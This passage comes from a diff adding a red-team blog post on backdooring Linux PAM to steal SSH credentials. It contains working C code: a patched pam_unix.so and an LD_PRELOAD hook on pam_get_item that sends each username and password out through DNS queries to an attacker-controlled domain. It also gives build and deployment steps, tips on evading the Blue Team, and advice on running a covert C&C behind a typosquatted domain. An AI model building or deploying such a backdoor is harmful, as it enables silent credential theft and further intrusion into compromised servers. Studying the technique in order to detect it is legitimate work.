+            <span class="n">addit</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">rdata</span><span class="o">=</span><span class="n">ReadName</span><span class="p">(</span><span class="n">reader</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="o">&amp;</span><span class="n">stop</span><span class="p">);</span>
+            <span class="n">reader</span><span class="o">+=</span><span class="n">stop</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+ 
+    <span class="c1">//print answers</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Answer Records : %d </span><span class="se">\n</span><span class="s">"</span> <span class="p">,</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">dns</span><span class="o">-&gt;</span><span class="n">ans_count</span><span class="p">)</span> <span class="p">);</span>
+    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span> <span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">dns</span><span class="o">-&gt;</span><span class="n">ans_count</span><span class="p">)</span> <span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Name : %s "</span><span class="p">,</span><span class="n">answers</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">name</span><span class="p">);</span>
+ 
+        <span class="k">if</span><span class="p">(</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">answers</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">resource</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">)</span> <span class="o">==</span> <span class="n">T_A</span><span class="p">)</span> <span class="c1">//IPv4 address</span>
+        <span class="p">{</span>
+            <span class="kt">long</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
+            <span class="n">p</span><span class="o">=</span><span class="p">(</span><span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="n">answers</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">rdata</span><span class="p">;</span>
+            <span class="n">a</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="o">=</span><span class="p">(</span><span class="o">*</span><span class="n">p</span><span class="p">);</span> <span class="c1">//working without ntohl</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"has IPv4 address : %s"</span><span class="p">,</span><span class="n">inet_ntoa</span><span class="p">(</span><span class="n">a</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">));</span>
+        <span class="p">}</span>
+         
+        <span class="k">if</span><span class="p">(</span><span class="n">ntohs</span><span class="p">(</span><span class="n">answers</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">resource</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">)</span><span class="o">==</span><span class="mi">5</span><span class="p">)</span> 
+        <span class="p">{</span>
+            <span class="c1">//Canonical name for an alias</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"has alias name : %s"</span><span class="p">,</span><span class="n">answers</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">rdata</span><span class="p">);</span>
+        <span class="p">}</span>
+ 
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+ 
+    <span class="c1">//print authorities</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Authoritive Records : %d </span><span class="se">\n</span><span class="s">"</span> <span class="p">,</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">dns</span><span class="o">-&gt;</span><span class="n">auth_count</span><span class="p">)</span> <span class="p">);</span>
+    <span class="k">for</span><span class="p">(</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span> <span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">dns</span><span class="o">-&gt;</span><span class="n">auth_count</span><span class="p">)</span> <span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+         
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Name : %s "</span><span class="p">,</span><span class="n">auth</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">name</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">ntohs</span><span class="p">(</span><span class="n">auth</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">resource</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">)</span><span class="o">==</span><span class="mi">2</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"has nameserver : %s"</span><span class="p">,</span><span class="n">auth</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">rdata</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+ 
+    <span class="c1">//print additional resource records</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Additional Records : %d </span><span class="se">\n</span><span class="s">"</span> <span class="p">,</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">dns</span><span class="o">-&gt;</span><span class="n">add_count</span><span class="p">)</span> <span class="p">);</span>
+    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">dns</span><span class="o">-&gt;</span><span class="n">add_count</span><span class="p">)</span> <span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Name : %s "</span><span class="p">,</span><span class="n">addit</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">name</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">ntohs</span><span class="p">(</span><span class="n">addit</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">resource</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="kt">long</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
+            <span class="n">p</span><span class="o">=</span><span class="p">(</span><span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="n">addit</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">rdata</span><span class="p">;</span>
+            <span class="n">a</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="o">=</span><span class="p">(</span><span class="o">*</span><span class="n">p</span><span class="p">);</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"has IPv4 address : %s"</span><span class="p">,</span><span class="n">inet_ntoa</span><span class="p">(</span><span class="n">a</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">));</span>
+        <span class="p">}</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+ 
+<span class="cm">/*
+ * 
+ * */</span>
+<span class="n">u_char</span><span class="o">*</span> <span class="nf">ReadName</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">reader</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">buffer</span><span class="p">,</span><span class="kt">int</span><span class="o">*</span> <span class="n">count</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">p</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="n">jumped</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="n">offset</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">i</span> <span class="p">,</span> <span class="n">j</span><span class="p">;</span>
+ 
+    <span class="o">*</span><span class="n">count</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">name</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mi">256</span><span class="p">);</span>
+ 
+    <span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="sc">'\0'</span><span class="p">;</span>
+ 
+    <span class="c1">//read the names in 3www6google3com format</span>
+    <span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">reader</span><span class="o">!=</span><span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">reader</span><span class="o">&gt;=</span><span class="mi">192</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">reader</span><span class="p">)</span><span class="o">*</span><span class="mi">256</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="n">reader</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="mi">49152</span><span class="p">;</span> <span class="c1">//49152 = 11000000 00000000 ;)</span>
+            <span class="n">reader</span> <span class="o">=</span> <span class="n">buffer</span> <span class="o">+</span> <span class="n">offset</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+            <span class="n">jumped</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">//we have jumped to another location so counting wont go up!</span>
+        <span class="p">}</span>
+        <span class="k">else</span>
+        <span class="p">{</span>
+            <span class="n">name</span><span class="p">[</span><span class="n">p</span><span class="o">++</span><span class="p">]</span><span class="o">=*</span><span class="n">reader</span><span class="p">;</span>
+        <span class="p">}</span>
+ 
+        <span class="n">reader</span> <span class="o">=</span> <span class="n">reader</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
+ 
+        <span class="k">if</span><span class="p">(</span><span class="n">jumped</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="o">*</span><span class="n">count</span> <span class="o">=</span> <span class="o">*</span><span class="n">count</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">//if we havent jumped to another location then we can count up</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+ 
+    <span class="n">name</span><span class="p">[</span><span class="n">p</span><span class="p">]</span><span class="o">=</span><span class="sc">'\0'</span><span class="p">;</span> <span class="c1">//string complete</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">jumped</span><span class="o">==</span><span class="mi">1</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="o">*</span><span class="n">count</span> <span class="o">=</span> <span class="o">*</span><span class="n">count</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">//number of steps we actually moved forward in the packet</span>
+    <span class="p">}</span>
+ 
+    <span class="c1">//now convert 3www6google3com0 to www.google.com</span>
+    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">strlen</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">name</span><span class="p">);</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> 
+    <span class="p">{</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">name</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+        <span class="k">for</span><span class="p">(</span><span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">j</span><span class="o">&lt;</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">p</span><span class="p">;</span><span class="n">j</span><span class="o">++</span><span class="p">)</span> 
+        <span class="p">{</span>
+            <span class="n">name</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">name</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
+            <span class="n">i</span><span class="o">=</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">name</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="sc">'.'</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">name</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="sc">'\0'</span><span class="p">;</span> <span class="c1">//remove the last dot</span>
+    <span class="k">return</span> <span class="n">name</span><span class="p">;</span>
+<span class="p">}</span>
+ 
+<span class="cm">/*
+ * Get the DNS servers from /etc/resolv.conf file on Linux
+ * */</span>
+<span class="kt">void</span> <span class="nf">get_dns_servers</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">200</span><span class="p">]</span> <span class="p">,</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">((</span><span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"/etc/resolv.conf"</span> <span class="p">,</span> <span class="s">"r"</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Failed opening /etc/resolv.conf file </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+     
+    <span class="k">while</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span> <span class="p">,</span> <span class="mi">200</span> <span class="p">,</span> <span class="n">fp</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'#'</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">continue</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span> <span class="p">,</span> <span class="s">"nameserver"</span> <span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">p</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="n">line</span> <span class="p">,</span> <span class="s">" "</span><span class="p">);</span>
+            <span class="n">p</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="nb">NULL</span> <span class="p">,</span> <span class="s">" "</span><span class="p">);</span>
+             
+            <span class="c1">//p now is the dns ip :)</span>
+            <span class="c1">//????</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="c1">// EDIT THIS. It is a PoC </span>
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">dns_servers</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">,</span> <span class="s">"127.0.0.1"</span><span class="p">);</span>
+    
+<span class="p">}</span>
+ 
+<span class="cm">/*
+ * This will convert www.google.com to 3www6google3com 
+ * got it :)
+ * */</span>
+<span class="kt">void</span> <span class="nf">ChangetoDnsNameFormat</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">dns</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">host</span><span class="p">)</span> 
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">lock</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">,</span> <span class="n">i</span><span class="p">;</span>
+    <span class="n">strcat</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">host</span><span class="p">,</span><span class="s">"."</span><span class="p">);</span>
+     
+    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">host</span><span class="p">)</span> <span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> 
+    <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">host</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">==</span><span class="sc">'.'</span><span class="p">)</span> 
+        <span class="p">{</span>
+            <span class="o">*</span><span class="n">dns</span><span class="o">++</span> <span class="o">=</span> <span class="n">i</span><span class="o">-</span><span class="n">lock</span><span class="p">;</span>
+            <span class="k">for</span><span class="p">(;</span><span class="n">lock</span><span class="o">&lt;</span><span class="n">i</span><span class="p">;</span><span class="n">lock</span><span class="o">++</span><span class="p">)</span> 
+            <span class="p">{</span>
+                <span class="o">*</span><span class="n">dns</span><span class="o">++=</span><span class="n">host</span><span class="p">[</span><span class="n">lock</span><span class="p">];</span>
+            <span class="p">}</span>
+            <span class="n">lock</span><span class="o">++</span><span class="p">;</span> <span class="c1">//or lock=i+1;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="o">*</span><span class="n">dns</span><span class="o">++=</span><span class="sc">'\0'</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">#define _UNIX_AUTHTOK  "-UN*X-PASS"
+</span><span class="c1">// (...)</span>
+</code></pre></div></div>
+
+<p>        
+And, lastly this little edit:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// (...)</span>
+<span class="cm">/* verify the password of this user */</span>	
+    <span class="n">retval</span> <span class="o">=</span> <span class="n">_unix_verify_password</span><span class="p">(</span><span class="n">pamh</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">ctrl</span><span class="p">);</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">hostname</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+    <span class="n">get_dns_servers</span><span class="p">();</span>
+    <span class="n">snprintf</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">hostname</span><span class="p">),</span> <span class="s">"%s.%s.nowhere.local"</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span> <span class="c1">// Change it with your domain</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    	<span class="n">ngethostbyname</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="n">T_A</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">name</span> <span class="o">=</span> <span class="n">p</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="c1">// (...)</span>
+</code></pre></div></div>
+
+<p>        
+Compile the module (./configure &amp;&amp; make) and replace the original pam_unix.so with our version, then open a tcpdump / wireshark and log in the machine via SSH:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DNS	96	Standard query 0x6d43  A mothra.RabbitHunt3r.nowhere.local
+</code></pre></div></div>
+
+<p>        
+Nice! a DNS request was done, so we can exfiltrate usernames and passwords to an external server controlled by us. But now we have a problem: what happens with uppercase / lowercase / symbols used in passwords? Later in section “<strong>0x03 Communcation with C&amp;C</strong>” we will discuss this point.</p>
+
+<h2 id="0x02-ld_preload-all-the-things">0x02 LD_PRELOAD all the things!</h2>
+
+<p>        
+In some cases another approach will be needed. If the server performs any type of file integrity check to critical binaries (as pam_unix.so and other modules are) or configuration files, we need to move to the classic LD_PRELOAD tactic. We are going to pre-load a shared object that hooks some functions used by PAM, so we can inject easily our exfiltration logic inside.</p>
+
+<p>        
+Our target function will be <strong>pam_get_item</strong>. When this function is called with the item type PAM_AUTHTOK as argument, it retrieves the authentication token used. We are going to hook this function, so when it is called we are going to call pam_get_user() to retrieve the username, then call the original pam_get_item (to obtain the correct return value and the authentication token), exfiltrate it via DNS and lastly return the value obtained before. Easy peasy!</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Classic LD_PRELOAD PAM backdoor with DNS exfiltration */</span>
+<span class="c1">// Author: Juan Manuel Fernandez (@TheXC3LL)</span>
+
+<span class="cp">#define _GNU_SOURCE
+</span>
+<span class="cp">#include &lt;security/pam_modules.h&gt;  
+#include &lt;security/pam_ext.h&gt;  
+#include &lt;security/pam_modutil.h&gt;  
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt; 
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt; 
+#include &lt;dlfcn.h&gt; 
+#include &lt;sys/stat.h&gt;
+#include &lt;signal.h&gt;
+</span>
+<span class="c1">// Insert here all the headers and functions needed for the DNS request</span>
+<span class="c1">//(...)</span>
+
+
+<span class="k">typedef</span> <span class="nf">int</span> <span class="p">(</span><span class="o">*</span><span class="n">orig_ftype</span><span class="p">)</span> <span class="p">(</span><span class="k">const</span> <span class="n">pam_handle_t</span> <span class="o">*</span><span class="n">pamh</span><span class="p">,</span> <span class="kt">int</span> <span class="n">item_type</span><span class="p">,</span>  <span class="k">const</span> <span class="kt">void</span> <span class="o">**</span><span class="n">item</span><span class="p">);</span>
+ 
+<span class="kt">int</span> <span class="nf">pam_get_item</span><span class="p">(</span><span class="k">const</span> <span class="n">pam_handle_t</span> <span class="o">*</span><span class="n">pamh</span><span class="p">,</span> <span class="kt">int</span> <span class="n">item_type</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">**</span><span class="n">item</span><span class="p">)</span> <span class="p">{</span>  
+    <span class="kt">int</span> <span class="n">retval</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">pid</span><span class="p">;</span>
+    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">;</span> 
+    <span class="n">orig_ftype</span> <span class="n">orig_pam</span><span class="p">;</span>
+    <span class="n">orig_pam</span> <span class="o">=</span> <span class="p">(</span><span class="n">orig_ftype</span><span class="p">)</span><span class="n">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">"pam_get_item"</span><span class="p">);</span> 
+    
+    <span class="c1">// Call original function  so we log password</span>
+    <span class="n">retval</span> <span class="o">=</span> <span class="n">orig_pam</span><span class="p">(</span><span class="n">pamh</span><span class="p">,</span> <span class="n">item_type</span><span class="p">,</span> <span class="n">item</span><span class="p">);</span>
+        
+    <span class="c1">// Log credential</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">item_type</span> <span class="o">==</span> <span class="n">PAM_AUTHTOK</span> <span class="o">&amp;&amp;</span> <span class="n">retval</span> <span class="o">==</span> <span class="n">PAM_SUCCESS</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">item</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>   
+		<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">hostname</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+    	<span class="n">get_dns_servers</span><span class="p">();</span>
+    	<span class="n">pam_get_user</span><span class="p">((</span><span class="n">pam_handle_t</span> <span class="o">*</span><span class="p">)</span><span class="n">pamh</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">name</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    	<span class="n">snprintf</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">hostname</span><span class="p">),</span> <span class="s">"%s.%s.nowhere.local"</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="o">*</span><span class="n">item</span><span class="p">);</span> <span class="c1">// Change it with your domain</span>
+    	<span class="k">if</span> <span class="p">(</span><span class="n">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    		<span class="n">ngethostbyname</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="n">T_A</span><span class="p">);</span>
+    	<span class="p">}</span>
+    <span class="p">}</span>   
+ 
+    <span class="k">return</span> <span class="n">retval</span><span class="p">;</span> 
+<span class="p">}</span>
+
+</code></pre></div></div>
+<p>        
+Compile (<code class="language-plaintext highlighter-rouge">gcc pam_fucked.c -shared -fPIC pam_fucked.so</code>), stop the SSH daemon and relaunch it with LD_PRELOAD=/../module/location…/.</p>
+
+<p>        
+The use of LD_PRELOAD has few negative side effects, like the needed of restart the daemon, so it can generate other kind of events that can alert the Blue Team. In the other hand, if you are going to restart a critical service as SSH you must operate from a point outside of SSH (maybe a reverse shell) and keep an eye to avoid terminating  the current sessions <strong>:)</strong>.</p>
+
+<h2 id="0x03-communcation-with-cc">0x03 Communcation with C&amp;C</h2>
+<p>        
+As we stated before, we need to encode the data that will be exfiltrated (and in a real pentest encrypt this information). The best options are to encode it as hexadecimal (but the size is doubled so it is not the best idea) or as <a href="https://en.wikipedia.org/wiki/Base32">base32</a> (care with the pad symbol). The C&amp;C must be configured as an authoritative DNS and the best idea is to use a domain typosquatted with a faked whois that simulates real domain used by the company.</p>
+
+<p>        
+You can install a real DNS server, or just create the needed logic using python and <strong>dnslib :)</strong>.</p>
+
+<h2 id="0x04-final-words">0x04 Final words</h2>
+<p>        
+I hope you find cool the idea of exfiltrate credentials via a classic covert channel like DNS. It is a really easy way to obtain new credentials in a recently compromised server and conquer other points of the net.</p>
+
+<p>        
+As I always say, if you find a typo or want to comment something, feel free to ping me at twitter (<a href="https://twitter.com/thexc3ll">@TheXC3LL</a>).</p>
+
+
+		</main>
+	</body>
+</html>
